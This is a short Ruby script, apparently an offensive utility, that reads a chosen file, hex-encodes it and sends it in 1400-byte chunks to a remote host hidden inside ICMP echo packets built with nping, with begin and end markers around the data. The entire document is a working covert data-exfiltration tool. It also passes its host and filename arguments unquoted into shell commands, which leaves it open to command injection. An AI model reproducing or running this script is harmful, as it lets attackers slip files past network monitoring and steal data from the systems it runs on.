#!/usr/bin/env ruby

# Usage: ./exfiltrate-data.rb [host] [filename]
# Takes the data from [filename], splits it up into ASCII hex chunks of
# 1400 bytes, and sends it out to [host].
@host = ARGV[0]
@fname = ARGV[1]

# Returns data in hexified, 1400-byte chunks
def chunked_data(fname)
  data = File.open(fname, "rb") {|f| f.read f.stat.size}
  hexified = data.each_byte.map {|x| "%0x" % x.ord}.join
  hexified.scan(/.{1,1400}/)
end

def exfil_data(host,fname)
  chunks = chunked_data(fname)
  puts "Exfiltrating #{fname} to #{host} in #{chunks.size} chunks."
  sleep 2
  puts %x{nping #{host} --icmp -c1 --data-string "BOFexfil-data.bin"}
  chunked_data(fname).each do |chunk|
    puts %x{nping #{host} --icmp -c1 -data #{chunk}}
  end
  puts %x{nping #{host} --icmp -c1 --data-string "EOF"}
end

exfil_data(@host,@fname)
